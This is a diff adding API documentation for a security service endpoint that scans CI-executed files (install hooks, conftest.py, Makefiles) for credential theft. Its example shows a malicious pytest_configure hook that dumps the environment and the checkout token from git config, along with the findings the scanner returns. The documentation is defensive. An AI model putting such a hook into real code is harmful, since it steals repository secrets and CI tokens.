@@ -1,0 +1,94 @@
+---
+title: "Analyze files that run during CI"
+openapi: "POST /v1/github/files/analyze"
+description: "Find credential theft hidden in package scripts, test setup, build files and shell scripts."
+---
+
+Some campaigns leave workflows untouched and hide the payload in a file the workflow already runs: a `postinstall` script, `conftest.py`, `setup.py` or a Makefile target. This endpoint checks those files for:
+
+* Reading the token that `actions/checkout` stores, dumping the environment, and harvesting credential files
+* Install hooks that run hidden scripts
+* Workflows created or dispatched from build code, and forged commit statuses
+* Exfiltration endpoints, encoded or obfuscated code, and indicators from campaigns such as prt-scan and wfx-loot
+
+Send the files a pull request adds or changes. The [GitHub Action](/guides/github-action) does this for you.
+
+Costs 2 units of your [rate limit](/getting-started/rate-limits) per request. Files are analyzed in memory and not stored.
+
+## Request
+
+```bash
+curl -X POST https://api.custoden.com/v1/github/files/analyze \
+  -H 'content-type: application/json' \
+  -d '{"files": [{"path": "tests/conftest.py", "content": "..."}]}'
+```
+
+| Field | Type | Description |
+|---|---|---|
+| `files` | array | 1 to 10 files |
+| `files[].path` | string | Repository-relative path, up to 512 characters. The file name decides how the file is analyzed |
+| `files[].content` | string | File contents |
+
+The body can be up to 256 KB.
+
+## Example
+
+```python tests/conftest.py
+def pytest_configure(config):
+    os.system("echo '==PRT_EXFIL_START_9c4e1a==' && (env; echo PRT_GIT_AUTH=$(git config --get-all http.https://github.com/.extraheader)) | gzip -c | base64")
+```
+
+```json
+{
+  "summary": { "critical": 2, "high": 1, "medium": 0, "low": 0, "info": 0, "total": 3 },
+  "files": [{ "path": "tests/conftest.py", "kind": "python-test-setup" }],
+  "findings": [
+    {
+      "rule": "checkout-token-extraction",
+      "severity": "critical",
+      "title": "Reads the token that actions/checkout stores in git config",
+      "detail": "Contains \"http.https://github.com/.extraheader\".",
+      "path": "tests/conftest.py",
+      "line": 2
+    },
+    {
+      "rule": "campaign-indicator",
+      "severity": "critical",
+      "title": "Matches the prt-scan campaign",
+      "detail": "Contains \"==PRT_EXFIL_START_\", an indicator published for prt-scan. ...",
+      "path": "tests/conftest.py",
+      "line": 2
+    },
+    { "rule": "environment-dump", "severity": "high", "...": "..." }
+  ]
+}
+```
+
+## Response
+
+| Field | Type | Description |
+|---|---|---|
+| `summary` | object | Count of findings per severity, plus `total` |
+| `files` | array | Each file with its `kind`: `package-manifest`, `python-build`, `python-test-setup`, `makefile`, `script`, `action` or `source` |
+| `findings` | array | See [CI file rules](/reference/ci-file-rules) |
+
+### Finding
+
+| Field | Type | Description |
+|---|---|---|
+| `rule` | string | Stable rule ID |
+| `severity` | string | `critical`, `high`, `medium`, `low` or `info` |
+| `title` | string | One-line summary |
+| `detail` | string | What was found |
+| `path` | string | The file it was found in |
+| `line` | integer | 1-based line |
+
+## Errors
+
+| Status | Code | When |
+|---|---|---|
+| 400 | `invalid_request` | No `files` array, or a file without `path` and `content` strings |
+| 400 | `too_many_files` | More than 10 files |
+| 400 | `invalid_json` | Body could not be parsed |
+| 413 | `payload_too_large` | Body exceeds 256 KB |
+| 429 | `rate_limited` | See [Rate limits](/getting-started/rate-limits) |
